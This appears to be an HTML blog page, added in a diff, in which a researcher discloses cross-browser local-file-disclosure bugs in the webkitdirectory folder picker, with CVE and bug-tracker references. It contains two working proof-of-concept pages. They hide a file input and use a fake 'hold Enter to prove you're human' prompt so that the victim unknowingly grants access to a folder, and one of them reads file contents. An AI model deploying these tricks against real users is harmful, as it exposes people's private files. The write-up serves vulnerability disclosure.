@@ -1,0 +1,170 @@
+<!doctype html>
+<html>
+<head>
+	<title>Chrome, Firefox and Edge Local Files Disclosure - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+<div id="qWriteup">
+<h1>Cross browser local files disclosure</h1>
+<br>
+
+<p>
+Did you know that you can turn a normal file picker into a folder picker? This is done by adding the attribute 'webkitdirectory' to a given input element of type='file'.
+<br><br>
+Obviously, the difference being that with the folder picker, you end up loading all the files within a selected folder. An obvious vector for bugs at first glance and so after a bit of messing around I ended up getting a few bugs in all three major browsers.
+<br><br>
+I will write about each browser seperately since each case is a bit different than the other. 
+<h2>Mozilla Firefox</h2>
+I have reported three different bugs to Mozilla in the webkitdirectory feature. Luckily the folder picker was only implement in Mozilla's Nightly browser, which is meant to test out new features before landing in the stable version.<br>
+<br>
+<b>Bug 1295914 - webkitdirectory could be used to trick users into allowing access to arbitrary folders (SEC-MEDIUM)</b><br>
+The first bug I reported that involved the folder picker was that of bad symantics. This bug was completely inspired by an 
+<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=252888" target="_blank">older bug fixed in Google Chrome</a> where the issue was about how undescriptive the UX titles were. Which could have lead to fooling unsuspecting users.
+<br>
+<br>
+<b>Bug 1319370 (CVE-2017-5414) webkitdirectory - OS username disclosure (SEC-MEDIUM)</b><br><br>
+I consider the second bug a key factor in achieving a full local files disclosure. The issue here was that when a file picker was opened once, then the second time its opened it would have descended one folder.<br>
+So I made a PoC where it showed if we tricked a victim into holding the 'Enter' key, then we could also pop a filepicker whilst this was happening and it would result in the user 'picking' a folder that they were unaware of.<br>
+In order to grab the OS username the victim would need to hold down the enter button for two filepicker dialogs, since (on Windows) the default directory is 'C:\Users\{username}'.
+<br>
+That is the main user interaction we rely on when trying to exploit this bug, inspired by <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2011-40/" target="_blank">this older Mozilla bug</a>. Another way is to trick a user into repeatedly pressing a certain location and popping the folderpicker there so that the 'confirm pick' button will be pressed automatically.
+<br><br>
+<b>Bug 1338637 - Arbitrary local files disclosure in input[webkitdirectory] (SEC-MEDIUM)</b><br><br>
+I found that if you would pop a filepicker while the user was holding the 'Enter' key, then we can trick a victim into giving us full access to all the files in the default directory. This came with some limits, being that on Windows OS it seemed like only the 'My Documents' folder was affected by this.<br>
+If it were a different folder like 'Desktop' (the default one) it would not load anything. This is a different matter on any other OS.<br>
+Thankfully, we have the bug previous to this one, where folders would descend after folderpicker use so I used this to my advantage in my bug report.<br><br>
+The following is the original PoC reported. Note that the first bug doesn't really have a PoC code (other than filepicker html) and I combined the 2nd and 3rd bugs into one PoC.<br>
+<br>
+<!-- HTML generated using hilite.me --><div class="qCode" style="overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;html&gt;</span>
+<span style="color: #007700">&lt;head&gt;</span>
+
+<span style="color: #007700">&lt;/head&gt;</span>
+<span style="color: #007700">&lt;body&gt;</span>
+<span style="color: #007700">&lt;style&gt;</span>
+<span style="color: #0066BB; font-weight: bold">#q</span>{
+<span style="color: #008800; font-weight: bold">opacity</span><span style="color: #333333">:</span><span style="color: #6600EE; font-weight: bold">0</span><span style="color: #333333">.</span><span style="color: #6600EE; font-weight: bold">0</span>;
+}
+<span style="color: #007700">&lt;/style&gt;</span>
+
+<span style="color: #007700">&lt;b&gt;</span>Hold down enter for 5 seconds to prove you&#39;re human<span style="color: #007700">&lt;/b&gt;</span>
+<span style="color: #007700">&lt;input</span> <span style="color: #0000CC">type=</span><span style="background-color: #fff0f0">file</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">q</span> <span style="color: #0000CC">webkitdirectory=</span><span style="background-color: #fff0f0">&#39;true&#39;</span><span style="color: #007700">&gt;&lt;br&gt;</span>
+<span style="color: #007700">&lt;textarea</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;qtxt&quot;</span> <span style="color: #0000CC">style=</span><span style="background-color: #fff0f0">&quot;height:300px;&quot;</span><span style="color: #007700">&gt;</span>Things grabbed:<span style="color: #007700">&lt;/textarea&gt;</span>
+<span style="color: #007700">&lt;script&gt;</span>
+<span style="color: #008800; font-weight: bold">var</span> i<span style="color: #333333">=</span><span style="color: #0000DD; font-weight: bold">25</span>;
+<span style="color: #007020">document</span>.onkeypress<span style="color: #333333">=</span><span style="color: #008800; font-weight: bold">function</span>(e){<span style="color: #008800; font-weight: bold">if</span>(q.value.length<span style="color: #333333">&gt;</span><span style="color: #0000DD; font-weight: bold">0</span>){qtxt.value<span style="color: #333333">+=</span>(q.value<span style="color: #333333">+</span><span style="background-color: #fff0f0">&#39;\n&#39;</span>);}
+	<span style="color: #008800; font-weight: bold">if</span>(q.value<span style="color: #333333">==</span><span style="background-color: #fff0f0">&#39;Documents&#39;</span>){
+		<span style="color: #007020">window</span>.i<span style="color: #333333">=</span><span style="color: #0000DD; font-weight: bold">1000</span>;
+		}
+	<span style="color: #008800; font-weight: bold">if</span>(e.key<span style="color: #333333">===</span><span style="background-color: #fff0f0">&#39;Enter&#39;</span>){
+		<span style="color: #007020">window</span>.i<span style="color: #333333">--</span>;
+		<span style="color: #008800; font-weight: bold">if</span>(<span style="color: #007020">window</span>.i<span style="color: #333333">&lt;</span><span style="color: #0000DD; font-weight: bold">3</span>){
+			q.click();
+		}
+	}
+};
+
+q.onchange<span style="color: #333333">=</span><span style="color: #008800; font-weight: bold">function</span>(){
+<span style="color: #008800; font-weight: bold">if</span>(<span style="color: #007020">window</span>.i<span style="color: #333333">&gt;</span><span style="color: #0000DD; font-weight: bold">10</span>){
+	<span style="color: #007020">document</span>.body.innerHTML<span style="color: #333333">=</span>(<span style="background-color: #fff0f0">&#39;I can read &#39;</span><span style="color: #333333">+</span>q.files.length<span style="color: #333333">+</span><span style="background-color: #fff0f0">&#39; files from Documents folder&#39;</span>);
+	}
+}
+<span style="color: #007700">&lt;/script&gt;</span>
+<span style="color: #007700">&lt;/body&gt;</span>
+<span style="color: #007700">&lt;/html&gt;</span>
+</pre></div>
+
+<br>
+<h2>Microsoft Edge</h2>
+I reported a similar bug on Edge, the difference was that the default directory was 'My Documents' so I showed that the folderpicker can be used to recieve all the files within a victims documents folder.<br>
+This has since been fixed.<br><br>
+Original PoC:<br><br>
+<!-- HTML generated using hilite.me --><div class="qCode" style=" overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;html&gt;</span>
+<span style="color: #007700">&lt;head&gt;</span>
+    <span style="color: #007700">&lt;title&gt;</span>
+		Read all files on PC - PoC - By @qab
+    <span style="color: #007700">&lt;/title&gt;</span>
+    <span style="color: #007700">&lt;style&gt;</span>
+        <span style="color: #0066BB; font-weight: bold">#thing</span> {
+            <span style="color: #008800; font-weight: bold">opacity</span><span style="color: #333333">:</span> <span style="color: #6600EE; font-weight: bold">0</span><span style="color: #333333">.</span><span style="color: #6600EE; font-weight: bold">0</span>;
+        }
+    <span style="color: #007700">&lt;/style&gt;</span>
+<span style="color: #007700">&lt;/head&gt;</span>
+
+<span style="color: #007700">&lt;body&gt;</span>
+    <span style="color: #007700">&lt;h3</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;qmsg&quot;</span><span style="color: #007700">&gt;</span>Hold down the ENTER key for 5 seconds to prove you&#39;re human..<span style="color: #007700">&lt;/h3&gt;</span>
+    <span style="color: #007700">&lt;input</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;thing&quot;</span> <span style="color: #0000CC">type=</span><span style="background-color: #fff0f0">&quot;file&quot;</span> <span style="color: #0000CC">webkitdirectory</span> <span style="color: #0000CC">mozdirectory</span> <span style="color: #0000CC">accept=</span><span style="background-color: #fff0f0">&quot;text/*&quot;</span> <span style="color: #007700">/&gt;</span>
+
+    <span style="color: #007700">&lt;script&gt;</span>
+	
+		  <span style="color: #008800; font-weight: bold">var</span> r <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">new</span> FileReader();
+        thing.onchange <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">function</span>() {
+            alert(<span style="background-color: #fff0f0">&#39;I can read &#39;</span> <span style="color: #333333">+</span> <span style="color: #008800; font-weight: bold">this</span>.files.length <span style="color: #333333">+</span> <span style="background-color: #fff0f0">&#39; files from anywhere on your pc!&#39;</span>);<span style="color: #888888">//This is for PoC only. We can access all data using this.files as seen next.</span>
+			r.onload<span style="color: #333333">=</span><span style="color: #008800; font-weight: bold">function</span>(){
+				alert(r.result);
+			};
+			
+			r.readAsText(thing.files[<span style="color: #0000DD; font-weight: bold">0</span>]);
+        };
+		
+        <span style="color: #888888">//This is where we detect if the user is holding the Enter button.</span>
+        <span style="color: #008800; font-weight: bold">var</span> i <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;
+        <span style="color: #007020">document</span>.onkeydown <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">function</span>() {
+            i<span style="color: #333333">++</span>;
+            <span style="color: #008800; font-weight: bold">if</span> (i <span style="color: #333333">&gt;</span> <span style="color: #0000DD; font-weight: bold">4</span>) {
+                thing.click();
+                i <span style="color: #333333">=</span> <span style="color: #333333">-</span><span style="color: #0000DD; font-weight: bold">10000</span>;
+                <span style="color: #007020">document</span>.onkeydown <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">null</span>;
+                setTimeout(<span style="color: #008800; font-weight: bold">function</span>() {
+                    qmsg.innerHTML <span style="color: #333333">=</span> <span style="background-color: #fff0f0">&#39;&lt;u&gt;Thank you! Please wait while we verify (this might take a few minutes).&lt;/u&gt;&#39;</span>;
+                }, <span style="color: #0000DD; font-weight: bold">1000</span>);
+            };
+        };
+    <span style="color: #007700">&lt;/script&gt;</span>
+<span style="color: #007700">&lt;/body&gt;</span>
+
+<span style="color: #007700">&lt;/html&gt;</span>
+</pre></div>
+
+<br>
+<h2>Google Chrome</h2>
+Google was the first vendor I contacted regarding this. After initially recieving a SEC-MEDIUM rating, it was later changed to SEC-LOW and ignored for months (~6). It turned out that Chrome would be able to detect this type of bug if anyone would try to use it on a mass scale, as it is logged by browser safety.<br>
+I'm still confused by this, but I believe what they mean is that they can both detect and block any malicious website that shows sudden high usage of the folder uploader. The same PoC reported to Microsoft works on Chrome as of writing this on 4/13/2017.<br>
+The worst part is that if the filepicker was defaulted to 'C:\', you would be able to read the entire disk..because the folder picker uploads all files within all sub directories. <br>
+
+
+</p><br>
+
+
+<p>
+<h2>References:</h2>
+<b>Arbitrary local files disclosure in input[webkitdirectory] bug report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1338637" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1338637</a><br>
+<b>(CVE-2017-5414) webkitdirectory - OS username disclosure</b><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1319370" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1319370</a><br>
+<b>webkitdirectory could be used to trick users into allowing access to arbitrary folders</b><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1295914" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1295914</a><br>
+<b>(CVE-2016-7239) Microsoft Edge Information Disclosure Vulnerability</b><a href="https://technet.microsoft.com/library/security/mt674627.aspx" target="_blank">https://technet.microsoft.com/library/security/mt674627.aspx</a><br>
+<b>Google bug report</b><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=637098" target="_blank">https://bugs.chromium.org/p/chromium/issues/detail?id=637098</a><br>
+
+<br>
+
+</p>
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
